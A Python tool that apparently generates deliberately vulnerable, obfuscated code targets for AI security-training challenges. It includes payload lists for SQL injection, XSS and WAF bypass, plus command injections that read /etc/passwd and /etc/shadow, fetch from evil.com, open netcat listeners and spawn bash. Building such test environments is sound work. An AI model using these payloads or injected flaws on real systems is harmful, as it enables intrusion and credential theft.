#!/usr/bin/env python3
"""
Advanced Vulnerability Mutator
Generates complex, evolving vulnerabilities based on AI learning patterns.
This system creates increasingly sophisticated targets as AI capabilities improve.
"""

import os
import sys
import json
import random
import string
import re
import ast
import astor
from pathlib import Path
from typing import Dict, List, Any, Optional
import base64
import hashlib

class AdvancedVulnMutator:
    def __init__(self, complexity_level: int = 1):
        """
        Initialize the advanced vulnerability mutator.
        
        Args:
            complexity_level: 1-10 scale of complexity (higher = more sophisticated)
        """
        self.complexity_level = max(1, min(10, complexity_level))
        self.mutation_patterns = self._load_mutation_patterns()
        self.obfuscation_techniques = self._load_obfuscation_techniques()
        
    def _load_mutation_patterns(self) -> Dict[str, List[str]]:
        """Load vulnerability mutation patterns."""
        return {
            'sql_injection': [
                "UNION SELECT", "OR 1=1", "'; DROP TABLE", "OR '1'='1",
                "UNION ALL SELECT", "OR 1=1--", "'; EXEC xp_cmdshell",
                "UNION SELECT NULL,NULL,NULL", "OR 'x'='x'", "'; WAITFOR DELAY"
            ],
            'xss': [
                "<script>alert(1)</script>", "javascript:alert(1)",
                "<img src=x onerror=alert(1)>", "';alert(1);//",
                "<svg onload=alert(1)>", "javascript:void(alert(1))",
                "<iframe src=javascript:alert(1)>", "';eval('alert(1)');//"
            ],
            'command_injection': [
                "; ls", "| cat /etc/passwd", "&& whoami", "|| id",
                "; cat /etc/shadow", "| wget http://evil.com", "&& curl",
                "; nc -l 4444", "| bash -i", "&& python -c"
            ],
            'authentication_bypass': [
                "admin'--", "admin' OR '1'='1", "admin'/*", "admin'#",
                "admin' UNION SELECT", "admin' AND 1=1", "admin' OR 1=1",
                "admin'/**/OR/**/1=1", "admin'%00", "admin'%0A"
            ]
        }
    
    def _load_obfuscation_techniques(self) -> Dict[str, List[str]]:
        """Load code obfuscation techniques."""
        return {
            'string_encoding': [
                'base64', 'hex', 'url_encoding', 'unicode_escape',
                'rot13', 'caesar_cipher', 'xor_encoding'
            ],
            'variable_obfuscation': [
                'random_names', 'unicode_chars', 'hex_names',
                'base64_names', 'rotated_names'
            ],
            'control_flow': [
                'dead_code', 'junk_conditions', 'nested_loops',
                'recursive_calls', 'exception_handling'
            ]
        }
    
    def mutate_vulnerability(self, vuln_type: str, original_code: str, 
                           ai_strengths: List[str], ai_weaknesses: List[str]) -> str:
        """
        Mutate a vulnerability based on AI learning analysis.
        
        Args:
            vuln_type: Type of vulnerability to mutate
            original_code: Original vulnerable code
            ai_strengths: AI's strong areas
            ai_weaknesses: AI's weak areas
            
        Returns:
            Mutated vulnerable code
        """
        mutated_code = original_code
        
        # Apply complexity-based mutations
        if self.complexity_level > 5:
            mutated_code = self._apply_advanced_mutations(mutated_code, vuln_type)
        
        if self.complexity_level > 7:
            mutated_code = self._apply_expert_mutations(mutated_code, vuln_type)
        
        # Apply AI-specific mutations
        if vuln_type in ai_strengths:
            mutated_code = self._apply_strength_challenges(mutated_code, vuln_type)
        
        if vuln_type in ai_weaknesses:
            mutated_code = self._apply_weakness_focus(mutated_code, vuln_type)
        
        # Apply obfuscation based on complexity
        if self.complexity_level > 3:
            mutated_code = self._apply_obfuscation(mutated_code)
        
        return mutated_code
    
    def _apply_advanced_mutations(self, code: str, vuln_type: str) -> str:
        """Apply advanced mutation techniques."""
        if vuln_type == 'sql_injection':
            # Add blind SQL injection patterns
            blind_patterns = [
                "AND (SELECT COUNT(*) FROM information_schema.tables) > 0",
                "AND (SELECT LENGTH(password) FROM users WHERE id=1) > 0",
                "AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1) > 0"
            ]
            code = self._inject_patterns(code, blind_patterns)
        
        elif vuln_type == 'xss':
            # Add DOM XSS and filter bypass patterns
            dom_patterns = [
                "document.location.hash.substring(1)",
                "window.name",
                "document.referrer",
                "location.search.substring(1)"
            ]
            code = self._inject_patterns(code, dom_patterns)
        
        return code
    
    def _apply_expert_mutations(self, code: str, vuln_type: str) -> str:
        """Apply expert-level mutation techniques."""
        if vuln_type == 'sql_injection':
            # Add time-based and error-based injection
            expert_patterns = [
                "AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
                "AND (SELECT COUNT(*) FROM information_schema.columns GROUP BY CONCAT(CHAR(32),CHAR(32),CHAR(32)))",
                "AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(CHAR(32),CHAR(32),CHAR(32),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
            ]
            code = self._inject_patterns(code, expert_patterns)
        
        return code
    
    def _apply_strength_challenges(self, code: str, vuln_type: str) -> str:
        """Apply challenges for AI's strong areas."""
        # Make it harder for areas where AI excels
        if vuln_type == 'sql_injection':
            # Add multiple layers of protection
            code = self._add_protection_layers(code, ['waf_bypass', 'encoding_bypass'])
        
        return code
    
    def _apply_weakness_focus(self, code: str, vuln_type: str) -> str:
        """Apply focused challenges for AI's weak areas."""
        # Make it more accessible for areas where AI struggles
        if vuln_type == 'buffer_overflow':
            # Add clearer exploitation paths
            code = self._add_exploitation_hints(code, vuln_type)
        
        return code
    
    def _apply_obfuscation(self, code: str) -> str:
        """Apply code obfuscation techniques."""
        # Variable name obfuscation
        if self.complexity_level > 4:
            code = self._obfuscate_variables(code)
        
        # String encoding
        if self.complexity_level > 6:
            code = self._encode_strings(code)
        
        # Control flow obfuscation
        if self.complexity_level > 8:
            code = self._obfuscate_control_flow(code)
        
        return code
    
    def _inject_patterns(self, code: str, patterns: List[str]) -> str:
        """Inject vulnerability patterns into code."""
        for pattern in patterns:
            if pattern not in code:
                # Find a good injection point
                injection_points = [
                    "WHERE id = ",
                    "SELECT * FROM ",
                    "INSERT INTO ",
                    "UPDATE users SET "
                ]
                
                for point in injection_points:
                    if point in code:
                        code = code.replace(point, point + f"'{pattern}' OR ")
                        break
        
        return code
    
    def _add_protection_layers(self, code: str, layers: List[str]) -> str:
        """Add protection layers that need to be bypassed."""
        for layer in layers:
            if layer == 'waf_bypass':
                code = self._add_waf_bypass(code)
            elif layer == 'encoding_bypass':
                code = self._add_encoding_bypass(code)
        
        return code
    
    def _add_waf_bypass(self, code: str) -> str:
        """Add WAF bypass techniques."""
        bypass_techniques = [
            "/*!50000UNION*/",
            "UN/**/ION",
            "UNI%00ON",
            "UNI%0AON"
        ]
        
        for technique in bypass_techniques:
            if "UNION" in code:
                code = code.replace("UNION", technique)
                break
        
        return code
    
    def _add_encoding_bypass(self, code: str) -> str:
        """Add encoding bypass techniques."""
        # URL encoding
        code = code.replace("'", "%27")
        code = code.replace(" ", "%20")
        code = code.replace("=", "%3D")
        
        return code
    
    def _add_exploitation_hints(self, code: str, vuln_type: str) -> str:
        """Add hints for exploitation."""
        if vuln_type == 'buffer_overflow':
            # Add buffer size hints
            code += "\n# Buffer size: 64 bytes"
            code += "\n# Return address offset: 76 bytes"
        
        return code
    
    def _obfuscate_variables(self, code: str) -> str:
        """Obfuscate variable names."""
        # Simple variable name obfuscation
        var_mappings = {
            'user_input': '_' + ''.join(random.choices(string.ascii_lowercase, k=8)),
            'query': '_' + ''.join(random.choices(string.ascii_lowercase, k=6)),
            'result': '_' + ''.join(random.choices(string.ascii_lowercase, k=7))
        }
        
        for old_name, new_name in var_mappings.items():
            code = code.replace(old_name, new_name)
        
        return code
    
    def _encode_strings(self, code: str) -> str:
        """Encode strings in the code."""
        # Find and encode string literals
        string_pattern = r'"([^"]*)"'
        
        def encode_match(match):
            original = match.group(1)
            encoded = base64.b64encode(original.encode()).decode()
            return f'base64.b64decode("{encoded}").decode()'
        
        code = re.sub(string_pattern, encode_match, code)
        
        return code
    
    def _obfuscate_control_flow(self, code: str) -> str:
        """Obfuscate control flow."""
        # Add junk conditions
        junk_conditions = [
            "if random.random() > 0.5:",
            "while False:",
            "for _ in range(0):"
        ]
        
        lines = code.split('\n')
        new_lines = []
        
        for line in lines:
            new_lines.append(line)
            if random.random() < 0.1:  # 10% chance to add junk
                new_lines.append(random.choice(junk_conditions))
                new_lines.append("    pass")
        
        return '\n'.join(new_lines)
    
    def generate_adaptive_template(self, base_template: Dict, ai_analysis: Dict) -> Dict:
        """Generate an adaptive template configuration."""
        template = base_template.copy()
        
        # Adjust complexity based on AI analysis
        complexity_multiplier = ai_analysis.get('complexity_multiplier', 1.0)
        new_complexity = int(self.complexity_level * complexity_multiplier)
        
        # Add adaptive features
        template['adaptive_features'] = {
            'complexity_level': new_complexity,
            'learning_focus': ai_analysis.get('weaknesses', [])[:3],
            'strength_challenges': ai_analysis.get('strengths', [])[:2],
            'mutation_intensity': min(10, new_complexity),
            'obfuscation_level': min(5, new_complexity // 2)
        }
        
        return template 